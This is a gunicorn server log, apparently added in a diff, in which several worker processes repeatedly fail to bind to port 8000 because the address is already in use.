+[2024-12-20 09:57:08 -0300] [5551] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:09 -0300] [5551] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:09 -0300] [5551] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:10 -0300] [5551] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:10 -0300] [5551] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:11 -0300] [5551] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:11 -0300] [5552] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:11 -0300] [5552] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:11 -0300] [5552] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:12 -0300] [5552] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:12 -0300] [5552] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:13 -0300] [5552] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:13 -0300] [5552] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:14 -0300] [5552] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:14 -0300] [5552] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:15 -0300] [5552] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:15 -0300] [5552] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:16 -0300] [5552] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:16 -0300] [5553] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:16 -0300] [5553] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:16 -0300] [5553] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:17 -0300] [5553] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:17 -0300] [5553] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:18 -0300] [5553] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:18 -0300] [5553] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:19 -0300] [5553] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:19 -0300] [5553] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:20 -0300] [5553] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:20 -0300] [5553] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:21 -0300] [5553] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:22 -0300] [5554] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:22 -0300] [5554] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:22 -0300] [5554] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:23 -0300] [5554] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:23 -0300] [5554] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:24 -0300] [5554] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:24 -0300] [5554] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:25 -0300] [5554] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:25 -0300] [5554] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:26 -0300] [5554] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:26 -0300] [5554] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:27 -0300] [5554] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:27 -0300] [5556] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:27 -0300] [5556] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:27 -0300] [5556] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:28 -0300] [5556] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:28 -0300] [5556] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:29 -0300] [5556] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:29 -0300] [5556] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:30 -0300] [5556] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:30 -0300] [5556] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:31 -0300] [5556] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:31 -0300] [5556] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:32 -0300] [5556] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:32 -0300] [5558] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:32 -0300] [5558] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:32 -0300] [5558] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:33 -0300] [5558] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:33 -0300] [5558] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:34 -0300] [5558] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:34 -0300] [5558] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:35 -0300] [5558] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:35 -0300] [5558] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:36 -0300] [5558] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:36 -0300] [5558] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:37 -0300] [5558] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:37 -0300] [5559] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:37 -0300] [5559] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:37 -0300] [5559] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:38 -0300] [5559] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:38 -0300] [5559] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:39 -0300] [5559] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:39 -0300] [5559] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:40 -0300] [5559] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:40 -0300] [5559] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:41 -0300] [5559] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:41 -0300] [5559] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:42 -0300] [5559] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:43 -0300] [5560] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:43 -0300] [5560] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:43 -0300] [5560] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:44 -0300] [5560] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:44 -0300] [5560] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:45 -0300] [5560] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:45 -0300] [5560] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:46 -0300] [5560] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:46 -0300] [5560] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:47 -0300] [5560] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:47 -0300] [5560] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:48 -0300] [5560] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:48 -0300] [5563] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:48 -0300] [5563] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:48 -0300] [5563] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:49 -0300] [5563] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:49 -0300] [5563] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:50 -0300] [5563] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:50 -0300] [5563] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:51 -0300] [5563] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:51 -0300] [5563] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:52 -0300] [5563] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:52 -0300] [5563] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:53 -0300] [5563] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:53 -0300] [5564] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:53 -0300] [5564] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:53 -0300] [5564] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:54 -0300] [5564] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:54 -0300] [5564] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:55 -0300] [5564] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:55 -0300] [5564] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:56 -0300] [5564] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:56 -0300] [5564] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:57 -0300] [5564] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:57 -0300] [5564] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:58 -0300] [5564] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:57:58 -0300] [5566] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:57:58 -0300] [5566] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:58 -0300] [5566] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:57:59 -0300] [5566] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:57:59 -0300] [5566] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:00 -0300] [5566] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:00 -0300] [5566] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:01 -0300] [5566] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:01 -0300] [5566] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:02 -0300] [5566] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:02 -0300] [5566] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:03 -0300] [5566] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:04 -0300] [5568] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:04 -0300] [5568] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:04 -0300] [5568] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:05 -0300] [5568] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:05 -0300] [5568] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:06 -0300] [5568] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:06 -0300] [5568] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:07 -0300] [5568] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:07 -0300] [5568] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:08 -0300] [5568] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:08 -0300] [5568] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:09 -0300] [5568] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:09 -0300] [5569] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:09 -0300] [5569] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:09 -0300] [5569] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:10 -0300] [5569] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:10 -0300] [5569] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:11 -0300] [5569] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:11 -0300] [5569] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:12 -0300] [5569] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:12 -0300] [5569] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:13 -0300] [5569] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:13 -0300] [5569] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:14 -0300] [5569] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:14 -0300] [5570] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:14 -0300] [5570] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:14 -0300] [5570] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:15 -0300] [5570] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:15 -0300] [5570] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:16 -0300] [5570] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:16 -0300] [5570] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:17 -0300] [5570] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:17 -0300] [5570] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:18 -0300] [5570] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:18 -0300] [5570] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:19 -0300] [5570] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:19 -0300] [5571] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:19 -0300] [5571] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:19 -0300] [5571] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:20 -0300] [5571] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:20 -0300] [5571] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:21 -0300] [5571] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:21 -0300] [5571] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:22 -0300] [5571] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:22 -0300] [5571] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:23 -0300] [5571] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:23 -0300] [5571] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:24 -0300] [5571] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:25 -0300] [5572] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:25 -0300] [5572] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:25 -0300] [5572] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:26 -0300] [5572] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:26 -0300] [5572] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:27 -0300] [5572] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:27 -0300] [5572] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:28 -0300] [5572] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:28 -0300] [5572] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:29 -0300] [5572] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:29 -0300] [5572] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:30 -0300] [5572] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:30 -0300] [5573] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:30 -0300] [5573] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:30 -0300] [5573] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:31 -0300] [5573] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:31 -0300] [5573] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:32 -0300] [5573] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:32 -0300] [5573] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:33 -0300] [5573] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:33 -0300] [5573] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:34 -0300] [5573] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:34 -0300] [5573] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:35 -0300] [5573] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:35 -0300] [5575] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:35 -0300] [5575] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:35 -0300] [5575] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:36 -0300] [5575] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:36 -0300] [5575] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:37 -0300] [5575] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:37 -0300] [5575] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:38 -0300] [5575] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:38 -0300] [5575] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:39 -0300] [5575] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:39 -0300] [5575] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:40 -0300] [5575] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:40 -0300] [5576] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:40 -0300] [5576] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:40 -0300] [5576] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:41 -0300] [5576] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:41 -0300] [5576] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:42 -0300] [5576] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:42 -0300] [5576] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:43 -0300] [5576] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:43 -0300] [5576] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:44 -0300] [5576] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:44 -0300] [5576] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:45 -0300] [5576] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:46 -0300] [5577] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:46 -0300] [5577] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:46 -0300] [5577] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:47 -0300] [5577] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:47 -0300] [5577] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:48 -0300] [5577] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:48 -0300] [5577] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:49 -0300] [5577] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:49 -0300] [5577] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:50 -0300] [5577] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:50 -0300] [5577] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:51 -0300] [5577] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:51 -0300] [5578] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:51 -0300] [5578] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:51 -0300] [5578] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:52 -0300] [5578] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:52 -0300] [5578] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:53 -0300] [5578] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:53 -0300] [5578] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:54 -0300] [5578] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:54 -0300] [5578] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:55 -0300] [5578] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:55 -0300] [5578] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:56 -0300] [5578] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:58:56 -0300] [5579] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:58:56 -0300] [5579] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:56 -0300] [5579] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:57 -0300] [5579] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:57 -0300] [5579] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:58 -0300] [5579] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:58 -0300] [5579] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:58:59 -0300] [5579] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:58:59 -0300] [5579] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:00 -0300] [5579] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:00 -0300] [5579] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:01 -0300] [5579] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:01 -0300] [5580] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:01 -0300] [5580] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:01 -0300] [5580] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:02 -0300] [5580] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:02 -0300] [5580] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:03 -0300] [5580] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:03 -0300] [5580] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:04 -0300] [5580] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:04 -0300] [5580] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:05 -0300] [5580] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:05 -0300] [5580] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:06 -0300] [5580] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:07 -0300] [5583] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:07 -0300] [5583] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:07 -0300] [5583] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:08 -0300] [5583] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:08 -0300] [5583] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
